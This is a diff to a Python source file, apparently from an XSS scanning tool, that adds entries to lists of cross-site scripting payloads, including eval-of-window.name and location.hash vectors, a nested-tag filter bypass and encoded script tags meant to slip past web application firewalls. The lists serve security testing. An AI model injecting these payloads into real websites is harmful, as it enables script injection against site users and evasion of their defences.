@@ -282,13 +282,15 @@ _probes = [
 _payloads = [
     '<q/oncut=open()>',
     '<svg/onload=eval(name)>',
+    '<svg/onload=eval(window.name)>',
+    '<svg/onload=eval(location.hash.slice(1))>',
     '<img src=x onerror=alert(/xss/)>',
     """<img src="javascript:alert('xss');">""",
     """<style>@im\\port'\\ja\\vasc\\ript:alert("xss")';</style>""",
     """<img style="xss:expr/*xss*/ession(alert('xss'))"> """,
     """<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">""",
     """<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">""",
-    """<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""",
+    """<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"""
 ]
 
 # payload for waf test
@@ -319,7 +321,9 @@ _waf_payloads = [
     '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
     '<img src=x onerror=confir\u006d`1`>',
     '<svg/onload=co\u006efir\u006d`1`>',
-    '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>'
+    '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>',
+    '<scriscriptpt>alert(/xss/)</scriscriptpt>',
+    '¼script¾alert(¢XSS¢)¼/script¾'
 ]
 
 # payload with html 5 features
